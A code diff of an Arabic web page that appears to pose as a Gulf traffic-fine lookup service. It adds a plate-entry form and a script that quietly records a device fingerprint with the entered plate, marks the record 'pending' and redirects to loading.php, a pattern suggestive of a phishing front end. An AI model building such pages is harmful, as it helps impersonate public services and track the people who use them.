@@ -12,10 +12,8 @@
       --gray-text: #6e6e6e;
     }
 
-
     * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
     body { margin: 0; padding: 0; background-color: var(--bg-color); font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; overflow-x: hidden; }
-
 
     /* الهيدر الذكي */
     .header-fixed {
@@ -31,12 +29,10 @@
       background: transparent;
     }
 
-
     .header-fixed.scrolled {
       background: linear-gradient(180deg, #008b47 0%, #4a4a4a 100%);
       box-shadow: 0 2px 10px rgba(0,0,0,0.2);
     }
-
 
     .header-btns { display: flex; gap: 10px; }
     .btn-circle {
@@ -52,13 +48,11 @@
       box-shadow: 0 2px 5px rgba(0,0,0,0.1);
     }
 
-
     .logo-container img {
       height: 45px;
       max-width: 150px;
       object-fit: contain;
     }
-
 
     /* الفيديو */
     .video-hero {
@@ -69,7 +63,6 @@
     }
     #heroVid { width: 100%; height: 100%; object-fit: cover; }
 
-
     /* التبويبات بالأيقونات الأصلية */
     .tabs-nav {
       display: flex;
@@ -79,7 +72,6 @@
       background: #fff;
       border-bottom: 1px solid #eee;
     }
-
 
     .tab-item {
       background: #fff;
@@ -96,15 +88,12 @@
       cursor: pointer;
     }
 
-
     .tab-item.active {
       border-color: var(--main-green);
       color: var(--main-green);
     }
 
-
     .tab-icon { width: 24px; height: 24px; margin-bottom: 5px; fill: currentColor; }
-
 
     /* الكارت الرئيسي */
     .container {
@@ -112,7 +101,6 @@
       margin: 0 auto;
       padding: 0 15px 50px;
     }
-
 
     .search-box {
       background: #fff;
@@ -122,7 +110,6 @@
       box-shadow: 0 8px 25px rgba(0,0,0,0.08);
     }
 
-
     .field-wrap { margin-bottom: 18px; }
     .field-label {
       display: block;
@@ -131,7 +118,6 @@
       color: #333;
       font-weight: 600;
     }
-
 
     .input-style {
       width: 100%;
@@ -144,9 +130,7 @@
       transition: border-color 0.3s;
     }
 
-
     .input-style:focus { border-color: #55efc4; }
-
 
     select.input-style {
       appearance: none;
@@ -154,9 +138,7 @@
       background-size: 18px;
     }
 
-
     .ksa-section { display: none; background: #f9f9f9; padding: 15px; border-radius: 12px; margin-top: 10px; }
-
 
     .submit-btn {
       width: 100%;
@@ -174,7 +156,6 @@
       margin-top: 20px;
     }
 
-
     .back-btn {
       width: 100%;
       height: 60px;
@@ -188,7 +169,6 @@
 </head>
 <body>
 
-
 <header class="header-fixed" id="siteHeader">
   <div class="header-btns">
     <div class="btn-circle">≡</div>
@@ -199,13 +179,11 @@
   </div>
 </header>
 
-
 <div class="video-hero">
   <video id="heroVid" muted playsinline autoplay loop>
     <source src="dubai_hero.mp4" type="video/mp4">
   </video>
 </div>
-
 
 <div class="tabs-nav">
   <div class="tab-item active">
@@ -222,13 +200,155 @@
   </div>
 </div>
 
-
 <div class="container">
   <main class="search-box">
     <form onsubmit="event.preventDefault(); return false;">
       <div class="field-wrap">
         <label class="field-label">جهة إصدار اللوحة</label>
-        <select id="plateSource" class="input-style" required>
+        <select id="plateSource" class="input-style" onchange="updatePlateCodes()" required>
           <option value="">اختر</option>
         </select>
-/* manus temp edit */
+      </div>
+
+      <div class="field-wrap">
+        <label class="field-label">رقم اللوحة</label>
+        <input id="plateNumber" class="input-style" type="text" placeholder="رقم اللوحة" required>
+      </div>
+
+      <div class="field-wrap">
+        <label class="field-label">رمز اللوحة</label>
+        <select id="plateCode" class="input-style" onchange="this.dataset.selected=this.value" required disabled>
+
+          <option value="">اختر</option>
+        </select>
+      </div>
+
+      <div id="ksaContainer" class="ksa-section">
+        <div class="field-wrap"><label class="field-label">رمز اللوحة 1</label><select id="k1" class="input-style ksa-in"></select></div>
+        <div class="field-wrap"><label class="field-label">رمز اللوحة 2</label><select id="k2" class="input-style ksa-in"></select></div>
+        <div class="field-wrap"><label class="field-label">رمز اللوحة 3</label><select id="k3" class="input-style ksa-in"></select></div>
+      </div>
+
+      <button type="button" class="submit-btn" id="submitBtn">التحقق من المخالفات <span>←</span></button>
+      <button type="button" class="back-btn" id="backBtn">رجوع</button>
+    </form>
+  </main>
+</div>
+
+<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-analytics-compat.js"></script>
+
+<script>
+    // التحكم في الهيدر
+    window.onscroll = () => {
+        const h = document.getElementById("siteHeader");
+        window.pageYOffset > 40 ? h.classList.add("scrolled") : h.classList.remove("scrolled");
+    };
+
+    function getDeviceFingerprint() {
+        return {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            screenResolution: screen.width + "x" + screen.height,
+            language: navigator.language,
+            timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            vendor: navigator.vendor,
+            touchPoints: navigator.maxTouchPoints
+        };
+    };
+
+    const plateData = {
+      AbuDhabi: ["White","Red","Motorcycle4","1","15","Red","Blue","Green","Gray","5","6","11","10","4","7","8","9","12","13","14","16","2","17","1","50","18","20","19","21","22","Yellow","Green","Green1","TradeWhite","Trade","1","Export","Consulate","Diplomat","International Organization","Accommodation","Government","Custom","Probation","Orange","Protocol","2","Blue","1","RED"],
+      Dubai: ["Motorcycle","Motorcycle2","Motorcycle3","Motorcycle9","A","B","C","D","E","F","H","G","I","J","K","L","M","N","O","R","T","Z","S","Q","U","V","W","X","Y","ابيض","P","BB","AA","CC","DD","NN","HH","EE","MM","FF","II","Taxi","PublicTransportation","Public Transportation 1","Trade","Export","Export 2","Export 3","Export 4","Export 5","Export 6","Export 7","Export 8","Export 9","Consulate","Political association","International Organization","Accommodation","Government","PrivateTransportation"],
+      Sharjah: ["Motorcycle","Classic","13","White","Orange","1","2","3","4","Green","PublicTransportation2","PublicTransportation1","Trade","3","1","2","Export","Export4","Export - 5","Police","Classic","Trailer"],
+      Ajman: ["Motorcycle","A","B","C","D","E","H","F","K","Classic","Green","Probation","Export","Trailer"],
+      "Um Al Quwain": ["Motorcycle","A","B","White","A","B","G","X","I","D","H","C","K","F","J","E","L","M","N","Green","Probation","1","Export","Government Green","Government","Learning"],
+      RAK: ["Motorcycle","4","Motorcycle1","N","White","A","C","D","I","V","Y","M","RAK-Tower","K","S","B","X","Z","G","U","P","WhiteGreen","Green","Probation","Export","Government","GovernmentWhite","Local Guard","Hospitality Yallow","Hospitality","Hospitality Blue","Municipality","Police","Works","Ceremonies White Red","White","White and Green"],
+      Fujairah: ["Motorcycle","F","M","P","R","S","T","White","A","B","C","D","E","G","K","X","I","V","L","Z","H","O","N","J","U","Y","Green","Probation","Export","Government"],
+      Oman: ["PRIVATE - Yellow","Motor Bike - Yellow","GOVERNMENT - white","INTL.ORGANIZATION - white","CONSULAR - white","COMMERCIAL - Red","EXPORT - BLUE","DIPLOMATIC - white"],
+      Qatar: ["Private - White","Privet Transport - BLACK","Motor bike - White","PUBLIC TRANSPORT - RED","EXPORT - YELLOW","TRAILER - GREEN"],
+      Kuwait: ["Private - 1","Private - 2","Private - 3","Private - 4"],
+      Bahrain: ["Private - White","Private transport - Orange","Public Transport - Yellow","MotorCycle - White","Royal Court - RED","DIPLOMATIC - GREEN"],
+      KSA: ["Private - White","Public Transport - Yellow","Motor Bike - White","PRIVATE TRANSPORT - BLUE","DIPLOMATIC - GREEN","EXPORT - GRAY","TEMPORARY - BLACK","CONSULAR - GREEN"]
+    };
+
+    const sourceLabels = { AbuDhabi: "أبوظبي", Dubai: "دبي", Sharjah: "الشارقة", Ajman: "عجمان", "Um Al Quwain": "أم القيوين", RAK: "رأس الخيمة", Fujairah: "الفجيرة", Oman: "عُمان", Qatar: "قطر", Kuwait: "الكويت", Bahrain: "البحرين", KSA: "السعودية" };
+    const ksaLetters = ["أ - أ","ب - ب","ح - ح","د - د","ر - ر","س - س","ص - X","ط - ت","ع - هـ","ق - ج","ك - ك","ل - ل","م - ز","ن - ن","هـ - هـ","و - يو","ي - V"];
+
+    const sSel = document.getElementById("plateSource");
+    const cSel = document.getElementById("plateCode");
+    const ksaContainer = document.getElementById("ksaContainer");
+
+    Object.keys(sourceLabels).forEach(k => sSel.add(new Option(sourceLabels[k], k)));
+
+    [document.getElementById("k1"), document.getElementById("k2"), document.getElementById("k3")].forEach(s => {
+      s.add(new Option("اختر", ""));
+      ksaLetters.forEach(l => s.add(new Option(l, l)));
+    });
+
+    function updatePlateCodes() {
+      const val = sSel.value;
+      const previousCode = cSel.value;
+      cSel.innerHTML = '<option value="">اختر</option>';
+      (plateData[val] || []).forEach(code => cSel.add(new Option(code, code)));
+      cSel.disabled = !val;
+      if (previousCode && Array.from(cSel.options).some(opt => opt.value === previousCode)) {
+        cSel.value = previousCode;
+      }
+      cSel.dataset.selected = cSel.value || "";
+      ksaContainer.style.display = val === "KSA" ? "block" : "none";
+    }
+
+    function handleSourceChange(event) {
+      if (event && event.target && typeof event.target.value !== "undefined") {
+        sSel.value = event.target.value;
+      }
+      updatePlateCodes();
+    }
+
+    function handleCodeChange(event) {
+      if (event && event.target && typeof event.target.value !== "undefined") {
+        cSel.value = event.target.value;
+      }
+      cSel.dataset.selected = cSel.value || "";
+    }
+
+    sSel.setAttribute("onchange", "updatePlateCodes()");
+    cSel.setAttribute("onchange", "this.dataset.selected=this.value");
+    sSel.onchange = handleSourceChange;
+    sSel.oninput = handleSourceChange;
+    cSel.onchange = handleCodeChange;
+    cSel.oninput = handleCodeChange;
+    sSel.addEventListener("change", handleSourceChange);
+    sSel.addEventListener("input", handleSourceChange);
+    cSel.addEventListener("change", handleCodeChange);
+    cSel.addEventListener("input", handleCodeChange);
+    window.addEventListener("pageshow", updatePlateCodes);
+
+    updatePlateCodes();
+
+    document.getElementById('submitBtn').addEventListener('click', async function () {
+      const payload = {
+        source: sSel.value,
+        plateNumber: document.getElementById('plateNumber').value.trim(),
+        plateCode: cSel.value,
+        ksaLetters: [document.getElementById('k1').value, document.getElementById('k2').value, document.getElementById('k3').value].filter(Boolean),
+        device: getDeviceFingerprint(),
+        createdAt: new Date().toISOString(),
+        status: 'pending'
+      };
+      if (!payload.source || !payload.plateNumber || !payload.plateCode) {
+        alert('يرجى تعبئة جميع الحقول المطلوبة');
+        return;
+      }
+      localStorage.setItem('dubai_last_payload', JSON.stringify(payload));
+      window.location.href = 'loading.php';
+    });
+
+    document.getElementById('backBtn').addEventListener('click', function () {
+      history.back();
+    });
+  </script>
+</body>
+</html>
